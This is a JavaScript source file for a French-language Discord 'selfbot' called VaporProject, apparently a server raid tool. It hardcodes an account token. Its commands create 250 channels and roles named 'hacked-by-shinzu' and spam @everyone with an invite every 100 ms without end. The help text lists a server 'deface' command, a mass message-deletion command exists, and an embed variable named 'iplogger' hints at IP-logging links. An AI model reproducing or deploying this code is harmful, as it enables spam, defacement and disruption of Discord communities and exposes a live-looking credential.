const Discord = require("discord.js"),
        bot = new Discord.Client(),
        sayembed = new Discord.RichEmbed(),
        ms = require("ms"),
        con = console.log,
        token = "MzU4MzE4ODc1Mjk4NzU4NjU2.XU2nWQ.UyNrYca8k0y4o4jH3RsIbIf5rtc",


        DiscordPermissions = [
        "ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
        "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
        "ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
        "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
        "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
        "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
        "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
        "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
        "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
        "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"
        ];


        commandIntervals = [];


        bot.login("MzU4MzE4ODc1Mjk4NzU4NjU2.XU2nWQ.UyNrYca8k0y4o4jH3RsIbIf5rtc");


        bot.on('ready',() => {
        let memberCount = bot.users.size;
        let serverCount = bot.guilds.size;
        con(
        `${"-".repeat(45)}\n`                              +
        "|      Bienvenue sur le Vapor Project.      |\n"  +
        `${"-".repeat(45)}\n`                              +
        "|   Commande pour le démarrer : 'xstart'    |\n"  +
        `${"-".repeat(45)}\n`
        );
        });
        

bot.on('message', msg => {
        bot.user.setStatus('dnd');
        var args = msg.content.split(' ').slice(1).join(' ');
        if (msg.author.id !== bot.user.id) return;
        if (msg.content === 'xstart') {
        if (msg.deletable) msg.delete();
        var helpAEmbed = new Discord.RichEmbed()
        .setThumbnail(msg.author.avatarURL)
        .setTitle(':gem: **VaporProject à bien été activé.** :gem:')
        .addField('Tapez **__xhelp__** pour avoir accès au panel des commandes.') 
        .setDescription("-")
        .setColor('#000000')
        .setImage('https://i.ytimg.com/vi/401re7GlOLM/maxresdefault.jpg')
        .setFooter('◊ Copyright © 2019 VaporProject. ◊')
        msg.channel.send(helpAEmbed).catch(err => con(err));
        }
        

        if (msg.content === 'xhelp') {
        if (msg.deletable) msg.delete();
        var helpAEmbed = new Discord.RichEmbed()
        .setThumbnail(msg.author.avatarURL)
        .setTitle(`**__Commandes du VaporProject :__**`)
        .addBlankField()
        .addField('__xplay [nom de votre jeu]__', '**• Vous permet de définir un statut "Joue à + [nom de votre jeu]".**')
        .addField('__xlive [nom de votre jeu]__', '**• Vous permet de définir un statut "Streame + [nom de votre jeu]".**')
        .addField('__xwatch [nom de votre jeu]__', '**• Vous permet de définir un statut "Regarde + [nom de votre jeu]".**')
        .addField('__xlisten [nom de votre jeu]__', '**• Vous permet de définir un statut "Écoute + [nom de votre jeu]".**')
        .addField('__xresetgame__', '**• Réinitialise votre statut de jeu.**')
        .addField('__xtest__', '**• Vous permet de voir si VaporProject est connecté.**')
        .addField('__xoff__', '**• Vous permet de déconnecté VaporProject.**')
        .addField('__xdeface__', '**•Vous permet de changer l`icône, le nom, et la localisation du serveur.**')
        .addField('__xclear__', '**• Supprime les messages que vous avez envoyé.**')
        .addField('__xping__', '**• Affiche les MS entre vous et le bot.**')
        .addField('__xuinfo__', '**• Affiche les informations de l`utilisateur mentionné.**')
        .addField('__xsinfo__', '**• Affiche les informations du serveur dans lequel vous tapez la commande.**')
        .addField('__xembed [message embed]__', '**• Vous permet de créer un embed avec le texte de votre choix.**')
        .addField('__xpp__', '**• Affiche la photo de profil de l`utilisateur mentionné.**')
        .setColor('#8000ff')
        .setImage('https://i.ytimg.com/vi/401re7GlOLM/maxresdefault.jpg')
        .setTimestamp()
        .setFooter('◊ Copyright © 2019 VaporProject. ◊')
        msg.channel.send(helpAEmbed).catch(err => con(err));
        }
        
        
        if (msg.content === 'xpseudo'){
        if (msg.deletable) msg.delete();
        var helpAEmbed = new Discord.RichEmbed()
        .addField('```Shinzu • Fvntom • Zetrix • Vetrix • Atom • Shizua • Warkoz • ./Sc4ry • setuid0x90 • Ushiro • Hiruko • Sicarius • Ghost • Prism```')
        .setColor('#000000')
        msg.channel.send(helpAEmbed).catch(err => con(err));
        }
        
         
        if (msg.content.startsWith('xembed')) {
        msg.delete()
        let lien = args.slice(0)
        let iplogger = new Discord.RichEmbed()
        .setDescription(`${lien}`)
        .setColor("#000000")
        .setFooter("◊ Copyright © 2019 VaporProject. ◊")
        msg.channel.send(iplogger).catch(console.error);
        }
        
         
        if(msg.content.startsWith("xpp")) {
        if(msg.channel.type === "dm") return;
        if(msg.deletable) msg.delete();
        var krakenmember = msg.mentions.members.first()
        let avatar_embed = new Discord.RichEmbed()
        .setAuthor(` Avatar de ${msg.mentions.users.first().username}`)
        .setColor("#000000")
        .setImage(krakenmember.user.avatarURL)
        return msg.channel.send(avatar_embed).catch(e => {});
        }
        

        if(msg.content === 'xping') {
        if(msg.deletable) msg.delete();
        msg.reply(`:gem: **Le ping est de** __***${Math.round(bot.ping)}*** ms__ ! :gem:`)
        }


        if(msg.content === "xxxxtoken"){
        if(msg.deletable) msg.delete();
        msg.channel.send(`:spy: **Voici votre token:** ${bot.token} **(__Évitez de le partager__)** :spy:`)
        }
        

        if(msg.content === 'xtest') {
        if(msg.deletable) msg.delete();
        msg.reply(`**:gem: VaporProject est bien connecté. :gem:**`)
        }
        

        if(msg.content === 'xoff'){
        if(msg.deletable) msg.delete();
        msg.channel.send(':gem: **VaporProject à été déconnecté avec : __succès__** :gem:')
        .then(bot.destroy());
        }
        

        if(msg.content.startsWith("xclear")) {
        let args = msg.content.split(" ").slice(1);
        let messagecount = parseInt(args[0]) || 999;
        var deletedMessages = -1;
        msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
        .then(messages => {
        messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
        }).then(() => {
        if (deletedMessages === -1) deletedMessages = 0;
        //msg.channel.send(` ${deletedMessages} message(s) **sont en cours de suppression automatique...**`)
        //.then(m => m.delete(5000));
        }).catch(console.error);
        }
        

        if(msg.content.startsWith("xresetgame")) {
        if(msg.deletable) msg.delete()
        bot.user.setActivity(null, {});
        return msg.reply(':gem: Votre statut de jeu à été réinitialisé avec succès. :gem:').then(m => m.delete(5000));
        }
        

        if(msg.content.startsWith("xlive")) {
        if(msg.deletable) msg.delete()
        let args = msg.content.split(' ').slice(1).join(' ')
        bot.user.setActivity(args, {type: "STREAMING", url: "https://www.twitch.tv/twitch"})
        }
        

        if(msg.content.startsWith("xwatch")) {
        if(msg.deletable) msg.delete()
        let args = msg.content.split(' ').slice(1).join(' ')
        bot.user.setActivity(args, {type: "WATCHING"})
        }
        

        if(msg.content.startsWith("xlisten")) {
        if(msg.deletable) msg.delete()
        let args = msg.content.split(' ').slice(1).join(' ')
        bot.user.setActivity(args, {type: "LISTENING"})
        }
        

        if(msg.content.startsWith("xplay")) {
        if(msg.deletable) msg.delete()
        let args = msg.content.split(' ').slice(1).join(' ')
        bot.user.setActivity(args, {type: "PLAYING"})
        }
        
        if(msg.content === 'xip') {
        if(msg.deletable) msg.delete();
        msg.reply(`**IP : 88.674.98.359**`)
        }
        

        if (msg.content === 'xapex' ) {
        if (msg.deletable) msg.delete();
        let inteval = setInterval(function() {
        msg.channel.send('**:star: @everyone : discord.gg/ApeXFR :star:**');
        }, 100);
        commandIntervals.push(inteval);
        }
        
     
        if(msg.content.startsWith("xsinfo")){
        if (msg.deletable) msg.delete();
        if(msg.channel.type === "dm") return;
        let infoEmbed = new Discord.RichEmbed()
        .setTitle("**__Informations du Serveur :__**")
        .addBlankField(1)
        .setColor('#000000')
        .addField("**Nom :**", msg.guild.name)
        .addField("**ID :**", msg.guild.id)
        .addField("**Localisation :**", msg.guild.region)
        .addField("**Date de création :**", msg.guild.createdAt)
        .addField("**Créateur :**", msg.guild.owner.user.tag)
        .addField("**Niveau de sécurité :**", msg.guild.verificationLevel)
        .addField("**Rôles :**", msg.guild.roles.size)
        .addField("**Nombre de membres :**", msg.guild.memberCount)
        .addField("**Salons :**", msg.guild.channels.size)
        .setThumbnail(msg.guild.iconURL)
        .setTimestamp()
        msg.channel.send(infoEmbed);
        }
        
        
        if(msg.content.startsWith("xuinfo")){
        if(msg.channel.type === "dm") return; 
        if(msg.deletable) msg.delete();
        var rakenmember2 = msg.mentions.members.first()
        var userinfo_embed = new Discord.RichEmbed()
        .setTitle('**__Informations utilisateur :__**')
        .setThumbnail(msg.author.avatarURL)
        .addBlankField(1)
        .setColor("#000000")
        .addField("**Pseudo :**", `${msg.mentions.users.first().username}`)
        .addField("**Date de création du compte :**", rakenmember2.user.createdAt)
        .addField("**Tag :**", '#'+rakenmember2.user.discriminator)
        .addField("**ID :**", rakenmember2.user.id)
        .addField("**Pseudo + tag :**", rakenmember2.user.tag)
        .setImage(rakenmember2.user.avatarURL)
        .setTimestamp()
        msg.channel.send(userinfo_embed).catch(err => con(err));
        }
       
        
        if(msg.content === 'xchannelspam') {
        if(msg.deletable) msg.delete();
        let i = 0;
        let interval = setInterval(function () {
        if (i === 250) clearInterval(interval);
        msg.guild.createChannel("hacked-by-shinzu").then(i++);
        }, 100);
        }
        
        
        if(msg.content === 'xrolespam') {
        if(msg.deletable) msg.delete();
        let i = 0;
        let interval = setInterval(function () {
        if (i === 250) clearInterval(interval);
        msg.guild.createRole("Hacked By Shinzu").then(i++);
        }, 100);
        }
       
         
  });
